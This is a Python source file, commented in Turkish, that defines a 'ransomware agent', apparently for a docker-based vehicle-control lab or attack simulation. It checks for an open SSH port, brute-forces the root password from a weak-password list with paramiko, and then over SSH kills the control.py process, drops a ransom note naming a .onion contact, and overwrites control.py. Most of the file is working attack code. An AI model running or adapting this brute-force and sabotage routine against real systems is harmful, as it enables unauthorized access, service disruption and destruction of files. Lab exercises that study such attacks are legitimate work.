import socket
import time

# Basit SSH brute force için paramiko kullan
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("⚠️  [RANSOMWARE] paramiko yüklü değil! pip install paramiko")


# Fidye notu
RANSOM_NOTE = """
╔══════════════════════════════════════════════════════════╗
║          !!!  UYARI: SİSTEM ŞİFRELENDİ  !!!             ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  Tüm araç kontrol dosyaları şifrelenmiştir.              ║
║  Sistemi geri almak için 48 saat içinde                  ║
║  iletişime geçin: darkweb@ransomgroup.onion              ║
║                                                          ║
║  Ödeme yapılmazsa tüm veriler silinecektir.              ║
║                                                          ║
║  ID: VEH-2026-CTRL-4421                                  ║
╚══════════════════════════════════════════════════════════╝
"""

# Şifre listesi (zayıf şifreler)
PASSWORD_LIST = [
    "1234", "admin", "password", "root", "123456",
    "toor", "qwerty", "letmein", "welcome", "test"
]


class RansomwareAgent:
    def __init__(self):
        self.ssh_host = "localhost"
        self.ssh_port = 2222          # docker-compose'da 2222:22 map edildi
        self.username = "root"
        self.found_password = None

    def check_ssh_open(self):
        """Port 2222'de SSH servisi var mı kontrol et"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.ssh_host, self.ssh_port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def brute_force_ssh(self):
        """Şifre listesini dene, doğru şifreyi bul"""
        if not PARAMIKO_AVAILABLE:
            print("❌ [RANSOMWARE] paramiko eksik, simüle ediliyor...")
            # Simülasyon modu — paramiko yoksa direkt başarılı say
            self.found_password = "1234"
            return True

        print(f"🔑 [RANSOMWARE] SSH Brute Force başlıyor: {self.ssh_host}:{self.ssh_port}")
        print(f"🔑 [RANSOMWARE] Kullanıcı: {self.username} | {len(PASSWORD_LIST)} şifre denenecek")

        for password in PASSWORD_LIST:
            try:
                print(f"   [-] Deneniyor: {self.username}:{password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username=self.username,
                    password=password,
                    timeout=3,
                    banner_timeout=5
                )
                # Bağlantı başarılı
                self.found_password = password
                client.close()
                print(f"✅ [RANSOMWARE] ŞİFRE BULUNDU: {self.username}:{password}")
                return True

            except paramiko.AuthenticationException:
                pass  # Yanlış şifre, devam et
            except Exception as e:
                print(f"   [!] Bağlantı hatası: {e}")
                time.sleep(0.5)

        print("❌ [RANSOMWARE] Brute force başarısız, şifre bulunamadı.")
        return False

    def execute_ransomware_via_ssh(self):
        """SSH ile sisteme gir, control.py'yi öldür, fidye notu bırak"""
        if not PARAMIKO_AVAILABLE:
            print("⚠️  [RANSOMWARE] Simülasyon modu — komutlar simüle ediliyor")
            self._simulate_attack()
            return True

        try:
            print(f"\n💀 [RANSOMWARE] SSH ile bağlanılıyor: {self.username}:{self.found_password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.ssh_host,
                port=self.ssh_port,
                username=self.username,
                password=self.found_password,
                timeout=5
            )

            # Adım 1: control.py'yi öldür (pkill)
            print("💀 [RANSOMWARE] Araç kontrol süreci sonlandırılıyor (pkill)...")
            stdin, stdout, stderr = client.exec_command("pkill -f control.py")
            time.sleep(1)
            print("💀 [RANSOMWARE] control.py SONLANDIRILDI.")

            # Adım 2: Fidye notunu sisteme bırak
            print("📄 [RANSOMWARE] Fidye notu bırakılıyor...")
            note_escaped = RANSOM_NOTE.replace('"', '\\"').replace('\n', '\\n')
            cmd = f'echo "{note_escaped}" > /app/DOSYALARINIZ_SIFRELENDI.txt'
            client.exec_command(cmd)
            time.sleep(0.5)
            print("📄 [RANSOMWARE] Fidye notu bırakıldı: /app/DOSYALARINIZ_SIFRELENDI.txt")

            # Adım 3: Kritik dosyaları "kilitle" (içeriğini değiştir)
            print("🔒 [RANSOMWARE] Kritik dosyalar şifreleniyor...")
            client.exec_command('echo "ENCRYPTED_BY_RANSOMWARE" > /app/control.py')
            time.sleep(0.5)
            print("🔒 [RANSOMWARE] control.py şifrelendi (üzerine yazıldı).")

            client.close()
            return True

        except Exception as e:
            print(f"❌ [RANSOMWARE] SSH saldırısı başarısız: {e}")
            return False

    def _simulate_attack(self):
        """paramiko yoksa görsel simülasyon"""
        print("💀 [RANSOMWARE] [SİMÜLASYON] SSH bağlantısı kuruldu: root:1234")
        time.sleep(0.5)
        print("💀 [RANSOMWARE] [SİMÜLASYON] pkill -f control.py → çalıştırıldı")
        time.sleep(0.5)
        print("📄 [RANSOMWARE] [SİMÜLASYON] Fidye notu bırakıldı")
        time.sleep(0.5)
        print("🔒 [RANSOMWARE] [SİMÜLASYON] Dosyalar şifrelendi")

    def run(self, blackboard):
        """Ajanın ana çalışma fonksiyonu"""
        state = blackboard.read_state()

        print("\n" + "=" * 60)
        print("💀 [RANSOMWARE AJANI] SALDIRI BAŞLIYOR")
        print("=" * 60)

        # Adım 1: SSH portu açık mı?
        print(f"\n🔍 [RANSOMWARE] SSH port kontrolü: {self.ssh_host}:{self.ssh_port}")
        if not self.check_ssh_open():
            print(f"❌ [RANSOMWARE] Port {self.ssh_port} kapalı! vehicle_controller çalışıyor mu?")
            blackboard.update_key("mission_status", "FAIL")
            return

        print(f"✅ [RANSOMWARE] SSH portu açık!")
        blackboard.update_key("vulnerabilities", ["SSH_OPEN_WEAK_PASSWORD"])

        # Adım 2: Brute force
        if not self.brute_force_ssh():
            blackboard.update_key("mission_status", "FAIL")
            return

        # Adım 3: Ransomware uygula
        success = self.execute_ransomware_via_ssh()

        if success:
            print("\n" + "=" * 60)
            print("💀 [RANSOMWARE] SALDIRI TAMAMLANDI!")
            print(RANSOM_NOTE)
            print("=" * 60)
            blackboard.update_key("logs", ["RANSOMWARE_DEPLOYED: vehicle_controller ele geçirildi."])
            blackboard.update_key("mission_status", "SUCCESS")
        else:
            blackboard.update_key("mission_status", "FAIL")